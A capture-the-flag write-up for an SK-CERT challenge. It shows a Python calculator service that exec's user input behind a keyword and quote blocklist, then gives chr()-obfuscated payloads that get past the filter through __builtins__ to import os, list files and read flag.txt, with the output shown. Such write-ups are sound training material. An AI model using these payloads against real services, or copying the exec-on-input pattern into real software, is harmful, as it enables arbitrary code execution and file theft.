# JAILE - Calculator

| Titel          | Kategorie | flag | Difficulty |
| :---        |    :----   |:--- |  :--- |
| JAILE - Calculator | Web Exploitation and Binary Exploitation  | SK-CERT{35c3p1ng_py7h0n_15_345y_745k} | medium (2 filled stars)|

## Description
You have found an exposed calculator program. It doesn't seem to do anything useful beyond simple arithmetic operations. The source code is also available on GitHub. Can you make this application more useful? Python version is 3.12.3

## Attachments
calc.py

```python
import socket
import os
import sys

def handle_client(conn):
    s_fd = conn.fileno()
    os.dup2(s_fd, 0)
    os.dup2(s_fd, 1)
    os.dup2(s_fd, 2)
    data = b""
    while True:
        chunk = conn.recv(4096)
        if not chunk:
            break
        data += chunk
        if b'\n' in data:
            break
    text = data.decode().strip()

    for keyword in ['eval', 'exec', 'import', 'open', 'os', 'read', 'system', 'write']:
        if keyword in text.lower():
            conn.sendall(b"Not allowed, killing\n")
            return

    # Check for forbidden characters.
    for character in ['\'', '\"']:
        if character in text.lower():
            conn.sendall(b"Not allowed, killing\n")
            return

    try:
        exec('print(' + text + ')')
    except Exception as e:
        conn.sendall(("Error: " + str(e) + "\n").encode())

def main():
    host = '127.0.0.1'
    port = 1337
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((host, port))
        s.listen(1)
        print(f"Listening on {host}:{port}")
        conn, addr = s.accept()  # Handle one connection.
        with conn:
            print(f"Connection from {addr}")
            handle_client(conn)
    sys.exit(0)

if __name__ == "__main__":
    main()
```

## Solution
Print list of files in current directory:

```python
print(__builtins__.__dict__[chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)](chr(111)+chr(115)).__dict__[chr(108)+chr(105)+chr(115)+chr(116)+chr(100)+chr(105)+chr(114)](chr(46)))
```

And then with this one I could read the flag file:

```python
print(__builtins__.__dict__[chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)](chr(111)+chr(115)).__dict__[chr(114)+chr(101)+chr(97)+chr(100)](__builtins__.__dict__[chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)](chr(111)+chr(115)).__dict__[chr(111)+chr(112)+chr(101)+chr(110)](chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116),0),100))
```

Essentially this is what the command does:

```python
import os
file_descriptor = os.open("flag.txt", 0)  # 0 = O_RDONLY (read-only mode)
flag_content = os.read(file_descriptor, 100)
print(flag_content)
```

This then prints the flag:

```
b'SK-CERT{35c3p1ng_py7h0n_15_345y_745k}\n'
```

The flag is `SK-CERT{35c3p1ng_py7h0n_15_345y_745k}`.